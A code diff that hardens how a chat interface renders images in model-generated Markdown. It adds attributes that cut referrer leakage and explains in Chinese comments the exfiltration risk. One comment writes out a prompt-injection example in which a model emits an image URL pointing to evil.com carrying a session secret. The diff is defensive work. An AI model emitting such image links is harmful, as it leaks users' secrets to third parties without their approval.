@@ -61,6 +61,31 @@ purify?.addHook("uponSanitizeElement", (node, data) => {
   if (type !== "checkbox") node.parentNode?.removeChild(node);
 });
 
+/**
+ * 图片的**加固**：模型输出里的 `![](https://…)` 是一张会被浏览器真的去拉的图。
+ *
+ * 风险不是 XSS（`<img>` 里的 SVG 不执行脚本、CSP 也不给脚本），而是**外传**：
+ * 每个外链图都会向第三方发一次请求，把「这条消息被打开了」以及用户的 IP/UA
+ * 交出去；最阴的一条是提示注入——让模型输出
+ * `![](https://evil.com/?x=<会话里的秘密>)` 就有了一个不经过工具审批的外传通道
+ * （`docs/audit-summary.md` §7.4 记的正是这个取舍，用户 2026-09-17 拍板：
+ * 为了「回答里的外链图能显示」保留 `img-src https:`）。
+ *
+ * 因此这里做三件不牺牲显示能力的事：
+ * - `referrerpolicy="no-referrer"`：不带来源信息；
+ * - `loading="lazy"` + `decoding="async"`：不滚到的图不拉、不阻塞解析；
+ * - **明文 `http:` 不放行**（CSP 的 `img-src` 只列了 `https:` 与 `data:`）：
+ *   它会被拦下，界面按「加载失败」降级。http 图既可被中间人替换，
+ *   又和 https 一样带外传面，没有理由为它开口子。
+ */
+purify?.addHook("afterSanitizeAttributes", (node) => {
+  if (node.nodeName !== "IMG") return;
+  const image = node as Element;
+  image.setAttribute("referrerpolicy", "no-referrer");
+  image.setAttribute("loading", "lazy");
+  image.setAttribute("decoding", "async");
+});
+
 /** 渲染选项。 */
 export interface RenderMarkdownOptions {
   /**
@@ -95,6 +120,9 @@ function sanitize(html: string): string {
       "section", "sup",
     ],
     ALLOWED_ATTR: ["href", "src", "alt", "title", "class", "type", "checked", "disabled",
+      // 图片加固用的三个属性（由上面的 `afterSanitizeAttributes` 钩子写入；
+      // 列在这里是为了「模型自己写的同属性」也走同一条白名单，不被静默剥掉）
+      "referrerpolicy", "loading", "decoding",
       // 脚注区的锚点与标记：`id="user-content-fn-1"` / `data-footnotes`
       "id", "data-footnotes"],
     // 复选框保持 disabled：消息里的框不该是能点的交互控件（官方亦然）
